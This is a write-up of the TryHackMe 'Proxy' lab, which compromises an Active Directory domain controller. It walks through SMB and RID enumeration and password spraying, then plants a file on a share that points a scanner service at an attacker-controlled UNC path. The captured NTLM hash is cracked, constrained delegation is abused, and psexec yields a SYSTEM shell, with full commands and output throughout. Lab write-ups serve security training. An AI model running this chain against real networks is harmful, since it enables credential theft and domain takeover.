---
lab: "Proxy"
date: "2026-09-22"
platform: "TryHackMe"
difficulty: "Medium"
---
# Room link: https://tryhackme.com/room/proxychallenge

![](../Attachments/Pasted%20image%2020260923031129.png)


```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-21 17:08:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 2026-05-19T02:27:27
|_Not valid after:  2026-11-18T02:27:27
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local        # <- DOMAIN NAME
|   DNS_Computer_Name: DC01.ctf.local # <- COMPUTER NAME
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-21T17:09:23+00:00
|_ssl-date: 2026-09-21T17:10:02+00:00; -1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49801/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

##### RPC 

```bash
$ rpcclient -U "" -N 10.49.160.62  
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
```

RPC null session is enabled but it doesn't have any permission whatsoever.

##### LDAP

```bash
$ ldapsearch -x -H ldap://10.49.160.62:389 -b "DC=CTF,DC=LOCAL" 2>&1 | head -20
# extended LDIF
#
# LDAPv3
# base <DC=CTF,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

`Anonymous bind` is disabled. This means that before I can query, I need to be authenticated first. 

##### SMB

###### SMB  SHARES

```bash
$ nxc smb proxy.thm -u "guest" -p "" --shares
SMB         10.49.160.62    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.160.62    445    DC01             [+] ctf.local\guest: 
SMB         10.49.160.62    445    DC01             [*] Enumerated shares
SMB         10.49.160.62    445    DC01             Share           Permissions     Remark
SMB         10.49.160.62    445    DC01             -----           -----------     ------
SMB         10.49.160.62    445    DC01             ADMIN$                          Remote Admin
SMB         10.49.160.62    445    DC01             C$                              Default share
SMB         10.49.160.62    445    DC01             IPC$            READ            Remote IPC
SMB         10.49.160.62    445    DC01             IT-Shared       READ,WRITE      IT Department Shared Resources
SMB         10.49.160.62    445    DC01             NETLOGON                        Logon server share 
SMB         10.49.160.62    445    DC01             SYSVOL                          Logon server share 
```

This shows that `guest` I have permissions on following shares.

- `IPC$ - READ`
- `IT-Shared - READ, WRITE` 

```bash
$ smbclient //proxy.thm/IT-Shared -U guest ""            
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 22 18:39:33 2026
  ..                                  D        0  Tue Sep 22 18:39:33 2026
  IT-Credentials-Backup.txt           A      406  Fri May 22 11:18:15 2026
  IT-Onboarding-Checklist.txt         A      676  Fri May 22 11:18:16 2026
  IT-Portal.html                      A     4887  Fri May 22 11:19:03 2026
```

I skipped `IPC$` because it doesn't have anything out of ordinary. `IT-Shared` contains 3 files.

`IT-Credentials-Backup.txt`

```text
$ cat IT-Credentials-Backup.txt  
IT Department - Credentials Backup
===================================
Generated: 2019-08-14
Status: ARCHIVED (accounts disabled pending security review)

  helpdesk.bob  :  {REDACTED}    [DISABLED - left company 2021]
  it.admin      :  {REDACTED}   [DISABLED - role change 2022]

NOTE: These accounts have been disabled. Active service accounts
      are managed separately by the sysadmin team.
```

`IT-Onboarding-Checklist.txt`

```text
$ cat IT-Onboarding-Checklist.txt 
IT Department Onboarding Checklist
====================================
Welcome to the team!

1. Get VPN access from sysadmin
2. Request AD account
3. Install tools (see software list on intranet)
4. Review security policies

Automated Services
------------------
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.

  Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.
    Password rotated quarterly -- do not store locally.

Questions? Email helpdesk@ctf.local

```

`IT-Portal.html` 

![](../Attachments/Pasted%20image%2020260922184835.png)

Important stuff to note in these files. 

- `{REDACTED}` - Old password of a user
- `{REDACTED}` - Old password of an Admin
- `File scanner` - Runs every 2 minutes. Enumerates the share `IT-Shared`, process them. Uses `Shell Commands` to inspect files.
###### SMB USERS

```


```bash
$ nxc smb proxy.thm -u "guest" -p "" --rid-brute
SMB         10.49.160.62    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.49.160.62    445    DC01             [+] ctf.local\guest: 
SMB         10.49.160.62    445    DC01             498: CTF\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.49.160.62    445    DC01             500: CTF\Administrator (SidTypeUser)
SMB         10.49.160.62    445    DC01             501: CTF\Guest (SidTypeUser)
SMB         10.49.160.62    445    DC01             502: CTF\krbtgt (SidTypeUser)
SMB         10.49.160.62    445    DC01             512: CTF\Domain Admins (SidTypeGroup)
SMB         10.49.160.62    445    DC01             513: CTF\Domain Users (SidTypeGroup)
SMB         10.49.160.62    445    DC01             514: CTF\Domain Guests (SidTypeGroup)
SMB         10.49.160.62    445    DC01             515: CTF\Domain Computers (SidTypeGroup)
SMB         10.49.160.62    445    DC01             516: CTF\Domain Controllers (SidTypeGroup)
SMB         10.49.160.62    445    DC01             517: CTF\Cert Publishers (SidTypeAlias)
SMB         10.49.160.62    445    DC01             518: CTF\Schema Admins (SidTypeGroup)
SMB         10.49.160.62    445    DC01             519: CTF\Enterprise Admins (SidTypeGroup)
SMB         10.49.160.62    445    DC01             520: CTF\Group Policy Creator Owners (SidTypeGroup)
SMB         10.49.160.62    445    DC01             521: CTF\Read-only Domain Controllers (SidTypeGroup)
SMB         10.49.160.62    445    DC01             522: CTF\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.49.160.62    445    DC01             525: CTF\Protected Users (SidTypeGroup)
SMB         10.49.160.62    445    DC01             526: CTF\Key Admins (SidTypeGroup)
SMB         10.49.160.62    445    DC01             527: CTF\Enterprise Key Admins (SidTypeGroup)
SMB         10.49.160.62    445    DC01             553: CTF\RAS and IAS Servers (SidTypeAlias)
SMB         10.49.160.62    445    DC01             571: CTF\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.49.160.62    445    DC01             572: CTF\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.49.160.62    445    DC01             1008: CTF\DC01$ (SidTypeUser)
SMB         10.49.160.62    445    DC01             1109: CTF\DnsAdmins (SidTypeAlias)
SMB         10.49.160.62    445    DC01             1110: CTF\DnsUpdateProxy (SidTypeGroup)
SMB         10.49.160.62    445    DC01             1111: CTF\svc.scanner (SidTypeUser)
SMB         10.49.160.62    445    DC01             1112: CTF\svc.mssql (SidTypeUser)
SMB         10.49.160.62    445    DC01             1113: CTF\helpdesk.bob (SidTypeUser)
SMB         10.49.160.62    445    DC01             1114: CTF\it.admin (SidTypeUser)

```

Users found: 

- `CTF\Administrator`
- `CTF\Guest`
- `CTF\svc.scanner`
- `CTF\svc.mssql`
- `CTF\helpdesk.bob`
- `CTF\it.admin`

With the password, I tried `password spraying` using the users found for username.

```bash
$ nxc smb proxy.thm -u users.txt -p passwords.txt --continue-on-success 2>&1 | grep "\[+\]"
SMB                      10.49.160.62    445    DC01             [+] CTF\helpdesk.bob:{REDACTED} (Guest)
SMB                      10.49.160.62    445    DC01             [+] CTF\it.admin:{REDACTED} (Guest)
```

I got 2 credentials but they have the `same permissions` as `guest`. 

Connecting the dots:

`WRITE access on IT-Shared` → `SVC.SCANNER scans the share every 2 minutes` → `Scanner executes shell commands`

Because the scanner `processes shell commands`, we can attempt to trigger `forced SMB authentication` by supplying an `SMB/UNC path` pointing to a server we control. When the scanner accesses the path, its Windows account may `automatically initiate SMB authentication to our server`, allowing us to `capture the resulting NetNTLM authentication material`.

`Trick.ps1` - Payload for the scanner to run. Pointed at the `SMB/UNC` path that I control.

```powershell    
Get-ChildItem \\192.168.155.33\EXFIL\
```

Go back to `smbclient` and `put` the file `trick.ps1` into `IT-Shared` share.

```bash
$ smbclient //proxy.thm/IT-Shared -U guest ""
Try "help" to get a list of possible commands.
smb: \> put trick.ps1
putting file trick.ps1 as \trick.ps1 (0.1 kB/s) (average 0.1 kB/s)
smb: \> ls
  .                                   D        0  Tue Sep 22 20:01:17 2026
  ..                                  D        0  Tue Sep 22 20:01:17 2026
  IT-Credentials-Backup.txt           A      406  Fri May 22 11:18:15 2026
  IT-Onboarding-Checklist.txt         A      676  Fri May 22 11:18:16 2026
  IT-Portal.html                      A     4887  Fri May 22 11:19:03 2026
  trick.ps1                           A       38  Tue Sep 22 20:01:17 2026
```

Run `Responder` on the `VPN Interface`.

```bash
$ sudo responder -I tun0 -v 

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events... 

[SMB] NTLMv2-SSP Client   : 10.49.160.62
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::{REDACTED}      
```

After waiting for 2 minutes, it intercepted `svc.scanner's NTLM hash`. We can use `hashcat` to crack the `NTLM hash`. 

```bash
$ hashcat -m 5600 svc_hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

SVC.SCANNER::{REDACTED}:{REDACTED} # <- Password

```

I tried `RDP` to get into the machine but it did not work. With that, I ran bloodhound remotely using `bloodhound-python`.

```bash
$ sudo bloodhound-python -d ctf.local -u svc.scanner -p '{REDACTED}' -ns 10.49.160.62 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ctf.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.ctf.local
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.ctf.local
INFO: Done in 00M 22S
```

After running bloodhound, it gave me `JSON files` for the `Active Directory`. I'll use `Bloodhound CE` to map out possible vectors for `Lateral movement` or `Privesc`.

```bash
$ ls -la | grep "json"  
-rw-r--r-- 1 root   root    3645 Sep 22 20:10 20260922201035_computers.json
-rw-r--r-- 1 root   root   24129 Sep 22 20:10 20260922201035_containers.json
-rw-r--r-- 1 root   root    3048 Sep 22 20:10 20260922201035_domains.json
-rw-r--r-- 1 root   root    3914 Sep 22 20:10 20260922201035_gpos.json
-rw-r--r-- 1 root   root   77985 Sep 22 20:10 20260922201035_groups.json
-rw-r--r-- 1 root   root    1883 Sep 22 20:10 20260922201035_ous.json
-rw-r--r-- 1 root   root   19152 Sep 22 20:10 20260922201035_users.json
```

This is the vector. `SVC.SCANNER` has `AllowedToDelegate` to the `DC01.CTF.LOCAL`.

![](../Attachments/Pasted%20image%2020260922201322.png)


`AllowedToDelegate` allows a user to `impersonate/authenticate` as a user to specific services on a target hosts.

Basically, I can impersonate `Administrator` at `DC01.CTL.LOCAL` to access its machine using `PsExec.py` by requesting a `Service ticket` using `getST.py` from `impacket`.

```bash
$ getST.py -k -dc-ip 10.49.160.62 -impersonate Administrator -spn cifs/DC01.CTF.LOCAL CTF.LOCAL/svc.scanner

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache

```

Import the file using the `Full path` as `KRB5CCNAME` then try to login. 

```bash
$ export KRB5CCNAME=/home/zephyr/Labs/Proxy/Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache 

$ psexec.py CTF.LOCAL/Administrator@DC01.CTf.LOCAL -k -no-pass -target-ip 10.49.160.62

[*] Requesting shares on 10.49.160.62.....
[*] Found writable share ADMIN$
[*] Uploading file IKhrqESy.exe
[*] Opening SVCManager on 10.49.160.62.....
[*] Creating service HsMr on 10.49.160.62.....
[*] Starting service HsMr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
{REDACTED}
```


